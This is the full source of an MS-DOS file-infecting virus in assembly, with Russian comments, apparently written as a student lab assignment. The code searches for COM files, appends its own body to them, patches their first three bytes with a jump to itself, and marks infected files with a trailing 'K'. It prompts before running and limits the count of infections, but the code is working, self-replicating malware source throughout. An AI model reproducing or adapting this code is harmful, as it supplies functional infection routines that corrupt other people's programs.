prg segment
    assume cs:prg,ds:prg,es:prg,ss:prg
    org 100h				;Резервирование места для PSP (Program Segment Prefix)

start:
	jmp	vir					;Передача управления вирусному коду
	org 110h				;Размещение вирусного кода с адреса 110h
	
vir:
	push	ds				;Сохранение регистра DS в стек
	mov	ax, ds				;Корректировка регистра DS
	db 05h					;Код команды
add_to_ds:				
	dw 0					;"ADD AX, 00h"
	mov	ds, ax				;AX->DS
	
							;восстановление заражённой программы - копирование первых 3-х байт
fresh_bytes:
	mov	al, old_bytes
	mov	cs:[100h], al
	mov	al, old_bytes + 1
	mov	cs:[101h], al
	mov	al, old_bytes + 2
	mov	cs:[102h], al
	
	mov	cx, 80h				;размер DTA(Data Transfer Arrea) - 128 байт
	mov	bx, 80h				;смещение к DTA
	lea	si, old_dta			;адрес массива
	
save_dta:
	mov	al, byte ptr cs:[bx];чтение из DTA байт и
	mov	ds:[si], al			;перенесение его в массив к новому байту
	inc	bx					
	inc	si
	loop	save_dta		;цикл 128 раз
	
	;запрос на заражение
	mov	ah, 09h
	lea	dx, message
	int	21h
	mov	ah, 09h
	lea	dx, messInputCount
	int	21h
	mov	ah, 08h
	int	21h
	sub al, 30h
	mov byte ptr files_infected, al
	mov	ah, 09h
	lea	dx, questionStart
	int	21h
waitAnswer:
	mov	ah, 08h
	int	21h
	cmp	al, 'y'
	jz	find_first
	cmp	al, 'n' 
	jmp	restore_dta
	
	
find_first:
	mov	ah, 4eh				;поиск первого файла
	mov	cx, 100010b		;normal(0x00), archive, hidden
	lea	dx, maska			;маска для поиска
	int	21h
	jnc	r_3					;файл найден
	jmp	restore_dta			;при ошибке - завершение программы
find_next:
	mov	ah, 3eh				;закрытие  неподходящего
	int	21h					;файла
	jnc	r_2
	jmp	restore_dta			;файл невозможно закрыть
r_2:
	mov	ah, 4fh				;поиск
	int	21h					;следующего
	jnc	r_3					;файл найден
	jmp	restore_dta			;при ошибке - завершение программы
r_3:
	mov	cx, 12				;стирание в буфере
	lea	si, fn				;"fn" имени  предыдущего файла
destroy_name:
	mov	byte ptr [si], 0
	inc	si
	loop	destroy_name

	xor si,si				;запись в буфер имени только
copy_name:					;что найденного файла
	mov	al, byte ptr cs:[si + 9eh]
	cmp	al, 0
	je	open				;в конце имени в
	mov	byte ptr ds:fn[si], al	;DTA всегда стоит
	inc	si					;ноль, его и
	
	jmp	copy_name			;необходимо достичь
	
open:
	mov	ax, 3d02h			;открытие файла для чтения и записи
	lea	dx, fn				;имя файла
	int	21h
	jnc	save_bytes
	jmp	restore_dta			;файл невозможно открыть
	
	;считаем три байта:
save_bytes:
	mov	bx, ax				;сохранение дескриптора в BX
	mov	ah, 3fh				;номер функции
	mov	cx, 3
	lea	dx, old_bytes		;буфер для считываемых данных
	int	21h
	jnc	found_size
	jmp	close				;при ошибке - закрытие файла
	
found_size:
	mov	ax, cs:[09ah]
	
	;нахождение размера файла
count_size:
	mov	si, ax
	cmp	ax, 25600			;файл длиннее 25 Кбайт?
	jna	toto				;нет
	jmp	find_next			;да - неподходящий файл
toto:
	test	ax, 000fh		;округление размера (логическое И - результат не сохраняется)
	jz	krat_16				;до целого числа
	or	ax, 000fh			;параграфов в (логическое ИЛИ - результат сохраняется, кароче устанавливается 000fh
	inc	ax					;большую сторону
	
krat_16:
	mov	di, ax				;запись  округленного  значения в DI
	
	;расчет  смещения для перехода на код вируса
	sub	ax, 3				;сама команда перехода занимает 3 байта
	mov	byte ptr new_bytes[1], al
	mov	byte ptr new_bytes[2], ah
	
	;смещение найдено
	mov	ax ,di				;количество параграфов,
	mov	cl, 4				;которое содержит
	shr	ax, cl				;заражаемая программа
	dec	ax					;учёт действия директивы "ORG 110h"
	mov	byte ptr add_to_ds, al
	mov	byte ptr add_to_ds + 1, ah
	
	;корректирующее число найдено
	mov	ax, 4200h			;установка
	xor	cx, cx				;указателя на
	dec	si					;последний байт
	mov	dx, si				;файла
	int	21h
	jnc	read_last
	jmp	close				;при ошибке - закрытие файла
	
read_last:
	mov	ah, 3fh				;считывание этого
	mov	cx, 1				;байта
	lea	dx, last			;в ячейку "last"
	int	21h                     
	jc	close				;при ошибке - закрытие файла

	cmp	last, 'K'			;"last" = "I"
	jne	write_vir			;нет - дальше
	jmp	find_next			;да - поиск другого файла
	
write_vir:
	mov	ax, 4200h			;установка
	xor	cx, cx				;указателя
	mov	dx, di				;на конец файла
	int	21h
	jc	close				;при ошибке - закрытие файла
	mov	ah, 40h				;запись  в файл
	mov	cx, vir_len			;кода вируса
	lea	dx, vir				;длиной vir_len
	int	21h
	jc	close				;при ошибке - закрытие файла
write_bytes:
	mov	ax, 4200h			;установка
	xor	cx, cx				;указателя
	xor	dx, dx				;на начало файла
	int	21h
	jc	close				;при ошибке - закрытие файла
	mov	ah, 40h				;запись в  файл
	mov	cx, 3				;первых трёх байт
	lea	dx, new_bytes		;(команда
	int	21h					;перехода)
	
close:
	mov	ah, 3eh				;закрытие зараженного
	int	21h					;файла
	
	inc	files_infected		;подсчёт количества
	mov	ah, 09h
	lea	dx, fileMess
	int	21h
	mov	ah, 09h
	lea	dx, fn
	int	21h
	mov	al, files_infected	;заражённых файлов
	cmp	al, 5				;если больше 1,
	jge	restore_dta			;то завершение программы,
	jmp	find_first			;иначе продолжение
	
restore_dta:
	mov	cx, 80h				;размер DTA - 128 байт
	mov	bx, 80h				;смещение к DTA
	lea	si, old_dta			;адрес массива
dta_fresh:
	mov	al, ds:[si]			;читаем из массива "old_dta"
	mov	byte ptr cs:[bx], al;байта и  перенесение его в DTA
	inc	bx					;к новому байту
	inc	si
	loop	dta_fresh

	pop	ds					;восстановление испорченного DS
	push	cs				;занесение в стек регистра CS
	db 0b8h					;код команды
jump:
	dw 100h					;"MOV AX, 100h"
	push	ax				;занесение в стек числа 100h
	retf					;передача управления на заданный адрес
	
old_bytes db 0e9h			;исходные три байта
          dw  vir_len + 0dh	;зараженной программы
old_dta db 128 dup (0)		;массив для хранения исходной DTA программы
maska db '*.com', 0			;маска для поиска файлов
fn db 12 dup (' '), '$',0 		;массив для хранения имя файла - жертвы

new_bytes db 0e9h			;первые три
          db 00h			;байта вируса
          db 00h			;в файле

message db 10, 13, 'Dmitry Klyuchnikov B_EVMd-41', 10, 13, 'Variant #1: ', 10, 13, 'Virus infects COM-files size less 25kb and attributes: Normal, Archive, Hidden. Infect 1 file', 10, 13 ,10, 13, '$'
questionStart db 10, 13,'Do you wish to start virus? (Y/N)', 10, 13, '$'
messInputCount db 'Input count files: ', '$'
mess db 10,13, 'Count Infect: ', '$'
fileMess db 10, 13, 'File Infect: ', '$'

files_infected db 0			;количество инфицированных файлов
count_files db 0
last db 0					;ячейка для последнего байта
     db 'K'					;последний байт вируса в файле
vir_len equ $ - vir			;длина вирусного кода
prg_end:
	mov	ah, 4ch				;завершение
	int	21h					;запускающей программы
     db 'K'					;без этого  символа вирус  заразил бы сам себя
prg ends
end start